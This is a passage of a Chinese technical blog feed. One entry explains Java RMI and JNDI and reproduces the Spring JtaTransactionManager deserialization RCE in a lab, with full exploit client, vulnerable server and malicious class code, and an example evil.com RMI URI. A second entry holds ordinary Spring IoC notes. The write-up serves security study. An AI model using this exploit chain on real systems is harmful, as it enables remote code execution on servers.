<li>一个需要这个远程服务的客户端程序<h1 id="Java-RMI示例"><a href="#Java-RMI示例" class="headerlink" title="Java RMI示例"></a>Java RMI示例</h1><h2 id="远程方法调用"><a href="#远程方法调用" class="headerlink" title="远程方法调用"></a>远程方法调用</h2>远程方法调用是分布式编程中的一个基本思想。而RMI（Remote Method Invocation）是专为Java环境设计的远程方法调用机制，远程服务器实现具体的Java方法并提供接口，客户端本地仅需根据接口类的定义，提供相应的参数即可调用远程方法。RMI依赖的通信协议为JRMP(Java Remote Message Protocol ，Java 远程消息交换协议)，该协议为Java定制，要求服务端与客户端都为Java编写。这个协议就像HTTP协议一样，规定了客户端和服务端通信要满足的规范。在RMI中对象是通过<strong>序列化方式</strong>进行编码传输的。<h2 id="远程对象"><a href="#远程对象" class="headerlink" title="远程对象"></a>远程对象</h2></li>
<li>首先我们定义一个远程接口<code>Clock.java</code><ul>
<li>定义远程服务接口（interface）</li>
<li>远程接口必须继承Remote</li>
<li>远程方法必须抛出RemoteException<blockquote>
<p>在Java中，只要一个类extends了java.rmi.Remote接口，即可成为存在于服务器端的远程对象， 供客户端访问并提供一定的服务。JavaDoc描述：Remote 接口用于标识其方法可以从非本地虚拟机上调用的接口。任何远程对象都必须直接或间接实现此接口。只有在“远程接口” 扩展 java.rmi.Remote 的接口）中指定的这些方法才可被远程调用</p>
</blockquote>
</li>
</ul>
</li>
</ol>
<p><img src="./Clock.png" alt="Clock.java"><br>2. 接下来定义远程接口的实现<code>ClockImpl.java</code><br><img src="./ClockImpl.png" alt="ClockImpl.java"></p>
<blockquote>
<ul>
<li>远程对象必须实现java.rmi.server.UniCastRemoteObject类，这样才能保证客户端访问获得远程对象时，</li>
<li>该远程对象将会把自身的一个拷贝以Socket的形式传输给客户端，此时客户端所获得的这个拷贝称为”stub”(存根)，</li>
<li>而服务器端本身已存在的远程对象则称之为”Skeleton”(骨架)。其实此时的存根是客户端的一个代理，用于与服务器端的通信，</li>
<li>而骨架也可认为是服务器端的一个代理，用于接收客户端的请求之后调用远程方法来响应客户端的请求。</li>
</ul>
</blockquote>
<h2 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h2><ol>
<li>根据主机和端口，获得服务注册器的引用</li>
<li>注册器根据服务名称查找对应的服务，并返回给客户端（Stub—-客户端代理）</li>
<li>客户对象通过Stub发送请求</li>
<li>Stub将调用信息（变量、方法名称等）打包，通过网络将它发送给Skeleton（服务辅助对象）</li>
<li>Skeleton将来自Stub的信息解包，找出被调用的方法（以及在哪个对象内），然后调用真正的服务对象上的真正方法</li>
<li>服务对象执行方法，获得返回结果，并将结果返回给Skeleton</li>
<li>Skeleton将返回结果打包，通过网络返回给Stub（注意返回结果必须是可序列化的）</li>
<li>Stub接受到数据后解包，返回给客户对象。</li>
<li>客户端所在的JVM启动后，可以多次调用服务端对象的方法。<blockquote>
<p>stub和skeleton代理都是在服务端程序中由RMI系统动态生成,服务端程序只需要继承java.rmi.server.UnicastRemoteObject类即可</p>
</blockquote>
<h2 id="如何获取Stub"><a href="#如何获取Stub" class="headerlink" title="如何获取Stub"></a>如何获取Stub</h2></li>
<li>调用某个远程服务上的方法，向远程服务获取存根<br>JDK提供了一个RMI注册表（RMIRegistry），RMIRegistry也是一个远程对象，默认监听在1099端口上，可以使用代码启动RMIRegistry，也可以使用rmiregistry命令。</li>
</ol>
<ul>
<li>要注册远程对象，需要RMI URL和一个远程对象的引用。</li>
<li><code>LocateRegistry.getRegistry()</code>会使用给定的主机和端口等信息本地创建一个Stub对象作为Registry远程对象的代理，从而启动整个远程调用逻辑。服务端应用程序可以向RMI注册表中注册远程对象，然后客户端向RMI注册表查询某个远程对象名称，来获取该远程对象的Stub。<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//创建Clock实例</span></span><br><span class="line">Clock impl = <span class="keyword">new</span> ClockImpl();</span><br><span class="line">LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">Registry registry = LocateRegistry.getRegistry();</span><br><span class="line">registry.bind(<span class="string">"Clock"</span>,stub);</span><br></pre></td></tr></table></figure>
从客户端角度来看服务端，服务端开启了两个端口，一个是RMI注册端口默认为1099，另一个是远程对象通信端口，由JVM随机分配，</li>
<li>客户端代码<code>ClockClient.java</code><br><img src="./ClockClient.png" alt="ClockClient.java"></li>
</ul>
<h2 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h2><p>Clock是暴露在网络中的接口，ClockImpl是一个服务端远程对象，重写了一个Hello方法供远程调用。它没有继承UnicastRemoteObject类，我们可以在构造方法中调用<code>UnicastRemoteObject.exportObject()</code>例如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ClockImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException</span>&#123;</span><br><span class="line">    UnicastRemoteObject.exportObject(<span class="keyword">this</span>, <span class="number">1099</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>也可以稍后在服务端代码中调用</p>
<ul>
<li>服务端代码<code>ClockServer.java</code><br><img src="./ClockServer.png" alt="ClockServer.java"><blockquote>
<p>注册远程对象,向客户端提供远程对象服务远程对象是在远程服务上创建的，你无法确切地知道远程服务器上的对象的名称。但是，将远程对象注册到RMI Service之后，客户端就可以通过RMI Service请求到该远程服务对象的stub了，利用stub代理就可以访问远程服务对象了</p>
</blockquote>
</li>
</ul>
<ul>
<li>服务端的流程是：</li>
</ul>
<ol>
<li>定义远程服务接口（interface）</li>
<li>定义远程服务接口的具体实现（implement）</li>
<li>将该远程服务注册到RMI命名服务上（指定主机及端口）（registry）</li>
<li>启动远程服务所在的jvm线程，此时服务端处于运行中。</li>
</ol>
<h1 id="运行实例"><a href="#运行实例" class="headerlink" title="运行实例"></a>运行实例</h1><ol>
<li>先运行服务端<br><img src="./server.png" alt="server"></li>
<li>运行客户端，调用成功<br><img src="./client.png" alt="client"></li>
</ol>
<h1 id="总结一下RMI-流程"><a href="#总结一下RMI-流程" class="headerlink" title="总结一下RMI 流程"></a>总结一下RMI 流程</h1><ol>
<li>服务端ClockImpl()继承Clock()创建远程对象</li>
<li>服务端CLock()注册远程对象</li>
<li>客户端访问服务器b并查找相应远程对象</li>
<li>服务端将stub(存根返回)客户端</li>
<li>客户端调用stub(存根)的方法</li>
<li>stub(存根)作为代理与服务端骨架通信   //骨架作为服务端代理</li>
<li>骨架代理调用ClockImpl相应方法</li>
<li>骨架将结果返回给客户端的存根</li>
<li>存根返回给客户端<br><img src="./%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84.jpg" alt="RMI体系结构"></li>
</ol>
<h1 id="动态加载类"><a href="#动态加载类" class="headerlink" title="动态加载类"></a>动态加载类</h1><p>RMI核心特点之一就是动态类加载，如果当前JVM中没有某个类的定义，它可以从远程URL去下载这个类的class，动态加载的对象class文件可以使用Web服务的方式进行托管。这可以动态的扩展远程应用的功能，RMI注册表上可以动态的加载绑定多个RMI应用。对于客户端而言，服务端返回值也可能是一些子类的对象实例，而客户端并没有这些子类的class文件，如果需要客户端正确调用这些子类中被重写的方法，则同样需要有运行时动态加载额外类的能力。客户端使用了与RMI注册表相同的机制。RMI服务端将URL传递给客户端，客户端通过HTTP请求下载这些类。</p>
<ul>
<li><strong>JNDI注入的利用方法中也借助了动态加载类的思路</strong>。</li>
<li>这里涉及到的角色：客户端、RMI注册表、远程对象服务器、托管class文件的Web服务器可以分别位于不同的主机上：<br><img src="./%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E7%B1%BB.png" alt="动态加载类"><h1 id="JNDI"><a href="#JNDI" class="headerlink" title="JNDI"></a>JNDI</h1>JNDI (Java Naming and Directory Interface) 是一组应用程序接口，它为开发人员查找和访问各种资源提供了统一的通用接口，可以用来定位用户、网络、机器、对象和服务等各种资源。比如可以利用JNDI在局域网上定位一台打印机，也可以用JNDI来定位数据库服务或一个远程Java对象。JNDI底层<strong>支持RMI远程对象</strong>，RMI注册的服务可以通过JNDI接口来访问和调用。</li>
<li>其实JNDI就如同Windows系统的注册表一样:<code>键:值</code><br><img src="./JNDI.png" alt="JNDI"><blockquote>
<p>JNDI：<code>路径+名称:对象名称</code><br>JNDI支持多种命名和目录提供程序（Naming and Directory Providers），RMI注册表服务提供程序（RMI Registry Service Provider）允许通过JNDI应用接口对RMI中注册的远程对象进行访问操作。将RMI服务绑定到JNDI的一个好处是更加透明、统一和松散耦合，RMI客户端直接通过URL来定位一个远程对象，而且该RMI服务可以和包含人员，组织和网络资源等信息的企业目录链接在一起。</p>
</blockquote>
</li>
<li>JNDI接口在初始化时，可以将RMI URL作为参数传入，而JNDI注入就出现在客户端的lookup()函数中，如果<code>lookup()</code>的参数可控就可能被攻击。<h2 id="JNDI注入"><a href="#JNDI注入" class="headerlink" title="JNDI注入"></a>JNDI注入</h2>在JNDI服务中，RMI服务端除了直接绑定远程对象之外，还可以通过<code>References</code>类来绑定一个外部的远程对象（当前名称目录系统之外的对象）。绑定了Reference之后，服务端会先通过Referenceable.getReference()获取绑定对象的引用，并且在目录中保存。当客户端在lookup()查找这个远程对象时，客户端会获取相应的<code>object factory</code>，最终通过<code>factory</code>类将<code>reference</code>转换为具体的对象实例。</li>
<li>利用流程</li>
</ul>
<ol>
<li>目标代码中调用了InitialContext.lookup(URI)，且URI为用户可控；</li>
<li>攻击者控制URI参数为恶意的RMI服务地址，如：rmi://evil.com//name；</li>
<li>攻击者RMI服务器向目标返回一个Reference对象，Reference对象中指定某个精心构造的Factory类；</li>
<li>目标在进行lookup()操作时，会动态加载并实例化Factory类，接着调用factory.getObjectInstance()获取外部远程对象实例；</li>
<li>攻击者可以在Factory类文件的构造方法、静态代码块、getObjectInstance()方法等处写入恶意代码，达到RCE的效果.<br>攻击目标扮演的相当于是JNDI客户端的角色，攻击者通过搭建一个恶意的RMI服务端来实施攻击。</li>
</ol>
<h1 id="Spring-JNDI注入与反序列化"><a href="#Spring-JNDI注入与反序列化" class="headerlink" title="Spring JNDI注入与反序列化"></a>Spring JNDI注入与反序列化</h1><p>Spring框架的spring-tx.jar中的JtaTransactionManager.readObject()中就存在这个问题，当进行对象反序列化的时候，会执行lookup()操作，其中lookup()参数可控导致了RCE。</p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>环境使用的是Github上<a href="https://github.com/zerothoughts/spring-jndi" target="_blank" rel="noopener">zerothoughts</a>提供的POC，主要功能就是一个简单的Client、Server端，运行在Spring环境下。</p>
<ul>
<li>其中Server端开启一个Socket连接，读取Client发送的序列化数据，然后反序列化得到对象</li>
<li>Client负责发送序列化数据以及实现一个JNDI注入来加载恶意类<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2>Spring框架的spring-tx.jar中的JtaTransactionManager.readObject()中，当进行对象反序列化的时候，会执行lookup()操作而且参数可控，可以进行JNDI注入。<h3 id="客户端-1"><a href="#客户端-1" class="headerlink" title="客户端"></a>客户端</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.net.*;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.*;</span><br><span class="line"><span class="keyword">import</span> com.sun.net.httpserver.*;</span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.*;</span><br><span class="line"><span class="keyword">import</span> javax.naming.*;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ExploitClient</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String serverAddress = args[<span class="number">0</span>];</span><br><span class="line">            <span class="keyword">int</span> port = Integer.parseInt(args[<span class="number">1</span>]);</span><br><span class="line">            String localAddress= args[<span class="number">2</span>];</span><br><span class="line">            <span class="comment">//启动web server，提供远程下载要调用类的接口</span></span><br><span class="line">            System.out.println(<span class="string">"Starting HTTP server"</span>);</span><br><span class="line">            HttpServer httpServer = HttpServer.create(<span class="keyword">new</span> InetSocketAddress(<span class="number">8088</span>), <span class="number">0</span>);</span><br><span class="line">            httpServer.createContext(<span class="string">"/"</span>,<span class="keyword">new</span> HttpFileHandler());</span><br><span class="line">            httpServer.setExecutor(<span class="keyword">null</span>);</span><br><span class="line">            httpServer.start();</span><br><span class="line">            <span class="comment">//下载恶意类的地址 http://127.0.0.1:8088/ExportObject.class</span></span><br><span class="line">            System.out.println(<span class="string">"Creating RMI Registry"</span>);</span><br><span class="line">            Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">            Reference reference = <span class="keyword">new</span> javax.naming.Reference(<span class="string">"ExportObject"</span>,<span class="string">"ExportObject"</span>,<span class="string">"http://127.0.0.1:8088/"</span>);</span><br><span class="line">            ReferenceWrapper referenceWrapper = <span class="keyword">new</span> com.sun.jndi.rmi.registry.ReferenceWrapper(reference);</span><br><span class="line">            registry.bind(<span class="string">"Object"</span>, referenceWrapper);</span><br><span class="line"></span><br><span class="line">            System.out.println(<span class="string">"Connecting to server "</span>+serverAddress+<span class="string">":"</span>+port);</span><br><span class="line">            Socket socket=<span class="keyword">new</span> Socket(serverAddress,port);</span><br><span class="line">            System.out.println(<span class="string">"Connected to server"</span>);</span><br><span class="line">            <span class="comment">//jndi的调用地址</span></span><br><span class="line">            String jndiAddress = <span class="string">"rmi://"</span>+localAddress+<span class="string">":1099/Object"</span>;</span><br><span class="line">            org.springframework.transaction.jta.JtaTransactionManager object = <span class="keyword">new</span> org.springframework.transaction.jta.JtaTransactionManager();</span><br><span class="line">            object.setUserTransactionName(jndiAddress);</span><br><span class="line">            <span class="comment">//发送payload</span></span><br><span class="line">            System.out.println(<span class="string">"Sending object to server..."</span>);</span><br><span class="line">            ObjectOutputStream objectOutputStream = <span class="keyword">new</span> ObjectOutputStream(socket.getOutputStream());</span><br><span class="line">            objectOutputStream.writeObject(object);</span><br><span class="line">            objectOutputStream.flush();</span><br><span class="line">            <span class="keyword">while</span>(<span class="keyword">true</span>) &#123;</span><br><span class="line">                Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>可以看到客户端首先启动一个HTTP服务来提供JNDI将要远程加载的恶意类</li>
<li>接下来注册并启动RMI服务，然后通过<code>References</code>类 绑定 我们HTTP服务提供的恶意类</li>
<li>最后就是RMI的调用过程了</li>
</ul>
<h3 id="服务端-1"><a href="#服务端-1" class="headerlink" title="服务端"></a>服务端</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.net.*;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ExploitableServer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ServerSocket serverSocket = <span class="keyword">new</span> ServerSocket(Integer.parseInt(<span class="string">"1111"</span>));</span><br><span class="line">            System.out.println(<span class="string">"Server started on port "</span> + serverSocket.getLocalPort());</span><br><span class="line">            <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">                <span class="comment">//等待连接</span></span><br><span class="line">                Socket socket = serverSocket.accept();</span><br><span class="line">                System.out.println(<span class="string">"Connection received from "</span> + socket.getInetAddress());</span><br><span class="line">                ObjectInputStream objectInputStream = <span class="keyword">new</span> ObjectInputStream(socket.getInputStream());</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="comment">//读取对象</span></span><br><span class="line">                    Object object = objectInputStream.readObject();</span><br><span class="line">                    System.out.println(<span class="string">"Read object "</span> + object);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                    System.out.println(<span class="string">"Exception caught while reading object"</span>);</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>服务端的代码很简单，就是一个读取序列化数据再进行反序列化的过程<blockquote>
<p>服务端收到客户端的payload，然后去访问客户端RMI服务，客户端RMI服务访问HTTP服务提供的恶意类，读取恶意类然后返回给Server，Server端接收序列化数据进行反序列化然后触发我们构造的恶意代码造成RCE</p>
</blockquote>
</li>
</ul>
<h2 id="本地复现"><a href="#本地复现" class="headerlink" title="本地复现"></a>本地复现</h2><p>我们首先启动服务端，再启动客户端，<br><img src="./ExpServer.png" alt="ExpServer"></p>
<p><img src="1.png" alt=""><br><img src="2.png" alt=""><br><img src="3.png" alt=""><br><img src="4.png" alt=""><br><img src="5.png" alt=""><br>以上就是调用栈了</p>
<ul>
<li>恶意类<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.BufferedInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ExportObject</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">exec</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">		String sb = <span class="string">""</span>;</span><br><span class="line">		BufferedInputStream in = <span class="keyword">new</span> BufferedInputStream(Runtime.getRuntime().exec(cmd).getInputStream());</span><br><span class="line">		BufferedReader inBr = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(in));</span><br><span class="line">		String lineStr;</span><br><span class="line">		<span class="keyword">while</span> ((lineStr = inBr.readLine()) != <span class="keyword">null</span>)</span><br><span class="line">			sb += lineStr + <span class="string">"\n"</span>;</span><br><span class="line">		inBr.close();</span><br><span class="line">		in.close();</span><br><span class="line">		<span class="keyword">return</span> sb;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">ExportObject</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">		String cmd=<span class="string">"calc.exe"</span>;</span><br><span class="line">		<span class="keyword">throw</span> <span class="keyword">new</span> Exception(exec(cmd));</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
利用 JtaTransactionManager 类中可以被控制的 readObject() 方法，从而构造恶意的被序列化类，其中利用 readObject() 会触发远程恶意类中的构造函数这一点，达到目的。<br>最后贴上结果：<br><img src="./result.gif" alt=""></li>
</ul>
<h1 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h1><ul>
<li><a href="https://blog.csdn.net/xinghun_4/article/details/45787549" target="_blank" rel="noopener">java RMI原理详解</a></li>
<li><a href="https://kingx.me/Exploit-Java-Deserialization-with-RMI.html" target="_blank" rel="noopener">深入理解JNDI注入与Java反序列化漏洞利用</a></li>
<li><a href="https://paper.seebug.org/312/#6-java-apache-commonscollections-rce" target="_blank" rel="noopener">seebug-深入理解 JAVA 反序列化漏洞</a></li>
</ul>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>Spring学习笔记</title>
    <url>/2021/03/10/Spring%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>is4b3lla3’s notes</p>
<a id="more"></a>

<h1 id="spring结构"><a href="#spring结构" class="headerlink" title="spring结构"></a>spring结构</h1><p><img src="./springframework.png" alt="spirng"></p>
<h1 id="三层架构"><a href="#三层架构" class="headerlink" title="三层架构"></a>三层架构</h1><p>表现层调用业务层<br>业务层调用持久层</p>
<ul>
<li><p>表现层（JSP）：<br>表现层也称为界面层，位于最外层（最上层），离用户最近。用于显示数据和接收用户输入的数据，为用户提供一种交互式操作的界面</p>
</li>
<li><p>业务层（逻辑层、service层）：<br>业务层（Business Logic Layer）无疑是系统架构中体现核心价值的部分。它的关注点主要集中在业务规则的制定、业务流程的实现等与业务需求有关的系统设计，也即是说它是与系统所应对的领域（Domain）逻辑有关，很多时候，也将业务逻辑层称为领域层。</p>
</li>
<li><p>持久层（DAO）：<br>持久层，有时候也称为是数据访问层，其功能主要是负责数据库的访问，可以访问数据库系统、二进制文件、文本文档或是XML文档。采用DAO模式，建立实体类和数据库表映射（ORM映射）。简单的说法就是实现对数据表的select、insert、update以及delete的操作。如果要加入ORM的元素，那么就会包括对象和数据表之间的mapping，以及对象实体的持久化。</p>
</li>
</ul>
<h2 id="三层与MVC的区别"><a href="#三层与MVC的区别" class="headerlink" title="三层与MVC的区别"></a>三层与MVC的区别</h2><p>三层与MVC的最不同的地方在于<strong>三层是没有Controller控制器的概念</strong>。虽然同样是架构级别的，三层与MVC相同的地方在于<strong>他们都有一个表现层（view）</strong>，但是他们不同的地方在于其他的两个层。<strong>MVC没有把业务的逻辑访问看成两个层</strong>，这是采用三层架构或MVC搭建程序最主要的区别。当然了，在三层中也提到了Model概念，但是三层架构中Model的概念与MVC中Model的概念是不一样的，“三层” 中典型的Model层是以实体类构成的，而MVC里，则是由业务逻辑与访问数据组成的。</p>
<p>在三层中JSP与Servlet代码都属于表示层，业务逻辑层则是完成业务规则的实体类，数据访问层则是JDBC等代码<br>MVC中：model：Java bean； view：jsp；controller：servlet</p>
<h1 id="程序之间的耦合"><a href="#程序之间的耦合" class="headerlink" title="程序之间的耦合"></a>程序之间的耦合</h1><h2 id="耦合"><a href="#耦合" class="headerlink" title="耦合"></a>耦合</h2><p>程序之间的依赖关系</p>
<ol>
<li>类之间的依赖</li>
<li>方法之间的依赖</li>
</ol>
<h2 id="解耦"><a href="#解耦" class="headerlink" title="解耦"></a>解耦</h2><p>降低程序之间的依赖关系</p>
<ul>
<li>实际开发中：<br>编译期不依赖，运行时才依赖<br>编译期的依赖导致该类独立性很差</li>
</ul>
<p>例子：<br>jdbc两种注册方式：</p>
<ol>
<li><code>Class.forName(&quot;com.mysql.jdbc.Driver()&quot;)</code>  编译时不依赖，运行依赖，检查jar包，没有jar包抛出<code>异常</code></li>
<li><code>DriverManager.registerDriver(new com.mysql.jdbc.Driver());</code> 编译时依赖，检查jar包，没有jar包<code>编译失败</code></li>
</ol>
<h2 id="解耦的思路"><a href="#解耦的思路" class="headerlink" title="解耦的思路"></a>解耦的思路</h2><ol>
<li>创建对象时候使用反射，而避免<code>new</code>关键字</li>
<li>通过读取配置文件，来获取要创建的对象全限定类名</li>
</ol>
<ul>
<li>Bean：计算机英语中：可重用组件的含义</li>
<li>java bean（Java编写的可重用组件） &gt; 实体类</li>
</ul>
<ol>
<li>配置文件来配置类<br> 配置的内容：唯一标识：全限定类名<br> （key=&gt;value）</li>
<li>读取配置文件内容，<strong>反射创建对象</strong></li>
</ol>
<p>配置文件可以是xml也可以是properties</p>
<ul>
<li>static｛｝</li>
</ul>
<p>称为static代码块 ,也叫静态代码块，</p>
<p>是在类中独立于类成员的static语句块，可以有多个，位置可以随便放，它不在任何的方法体内，JVM加载类时会执行这些静态的代码块，如果static代码块有多个，JVM将按照它们在类中出现的先后顺序依次执行它们，每个代码块只会被执行一次<br>利用静态代码块可以对一些static变量进行赋值<br><strong>静态代码块只在类加载是执行一次</strong></p>
<h1 id="ioc-控制反转"><a href="#ioc-控制反转" class="headerlink" title="ioc 控制反转"></a>ioc 控制反转</h1><p><img src="./ioc.png" alt="ioc"></p>
<blockquote>
<p>控制权转移<br>把创建对象的权利交给框架，是框架的的重要特征，并非面向对象的专用术语。它包括依赖注入和依赖查找<br>ioc作用：消减计算机程序的耦合。（解除代码依赖关系）</p>
</blockquote>
<h2 id="spring中的ioc以及两个接口区别"><a href="#spring中的ioc以及两个接口区别" class="headerlink" title="spring中的ioc以及两个接口区别"></a>spring中的ioc以及两个接口区别</h2><ul>
<li>Spring中的IOC容器是Map结构</li>
</ul>
<table>
<thead>
<tr>
<th>key String类型</th>
<th>value Object类型</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>2</td>
</tr>
</tbody></table>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Client</span> </span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取spring的IOC核心容器，并根据ID获取对象</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * ApplicationContext的3个常用实现类</span></span><br><span class="line"><span class="comment">     * ClassPathXmlApplicationContext：加载类路径下的配置文件，要求配置文件必须在类路径下。</span></span><br><span class="line"><span class="comment">     * FileSystemXmlApplicationContext：加载磁盘任意路径下的配置文件（必须有访问权限）</span></span><br><span class="line"><span class="comment">     * AnnotationConfigApplicationContext：读取注解创建容器</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * 核心容器的两个接口引发出的问题</span></span><br><span class="line"><span class="comment">     * ApplicationContext（单例对象适用）：构建核心容器时，创建对象采用的是立即加载。也就是说一读取完配置就马上创建配置文件中配置的对象。</span></span><br><span class="line"><span class="comment">     * BeanFactory（多例对象适用）：构建核心容器时，创建对象采用延迟加载的方式。也就是说什么时候根据ID获取对象，什么时候真正创建对象</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> args main</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//1. 获取核心容器对象</span></span><br><span class="line">        ApplicationContext ac = <span class="keyword">new</span> ClassPathXmlApplicationContext(<span class="string">"bean.xml"</span>);</span><br><span class="line">        <span class="comment">//2. 根据id获取bean对象</span></span><br><span class="line">        IAccountService as = (IAccountService)ac.getBean(<span class="string">"accountService"</span>);<span class="comment">//Object类型强转</span></span><br><span class="line">        IAccountDao adao = ac.getBean(<span class="string">"accountDao"</span>,IAccountDao.class);<span class="comment">//传给字节码强转</span></span><br><span class="line">        System.out.println(as);</span><br><span class="line">        System.out.println(adao);</span><br><span class="line">        as.saveAccount();</span><br><span class="line">        <span class="comment">//----------BeanFactory</span></span><br><span class="line">        Resource r = <span class="keyword">new</span> ClassPathResource(<span class="string">"bean.xml"</span>);</span><br><span class="line">        BeanFactory factory  = <span class="keyword">new</span> XmlBeanFactory(r);</span><br><span class="line">        IAccountService as1 = (IAccountService)factory.getBean(<span class="string">"accountService"</span>);</span><br><span class="line">        System.out.println(as1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="三种创建bean的方式"><a href="#三种创建bean的方式" class="headerlink" title="三种创建bean的方式"></a>三种创建bean的方式</h2><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">    <span class="comment">&lt;!--把对象的创建交给spring处理--&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"accountService"</span> <span class="attr">class</span> = <span class="string">"com.service.impl.AccountServiceImpl"</span>&gt;</span><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--    com1  --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--    spring 对bean的管理细节</span></span><br><span class="line"><span class="comment">            1. 创建bean的三种方式</span></span><br><span class="line"><span class="comment">            2. bean对象的作用范围</span></span><br><span class="line"><span class="comment">            3. bean对象的生命周期</span></span><br><span class="line"><span class="comment">    --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--    三种方式：</span></span><br><span class="line"><span class="comment">            1.在spring的配置文件中使用bean标签，配以id和class属性之后，且没有其他属性和标签，采用的就是默认构造函数创建bean对象。此时</span></span><br><span class="line"><span class="comment">            如果类中没有默认构造函数，则对象无法创建。（默认构造函数创建）--&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"accountService"</span> <span class="attr">class</span>=<span class="string">"com_1.service.impl.AccountServiceImpl"</span>&gt;</span><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--    2.使用普通工厂中的方法创建对象（使用某个类中的方法创建对象，并存入spring容器）</span></span><br><span class="line"><span class="comment">            com_1.factory.InstanceFactory</span></span><br><span class="line"><span class="comment">    --&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"instanceFactory"</span> <span class="attr">class</span>=<span class="string">"com_1.factory.InstanceFactory"</span>&gt;</span><span class="tag">&lt;/<span 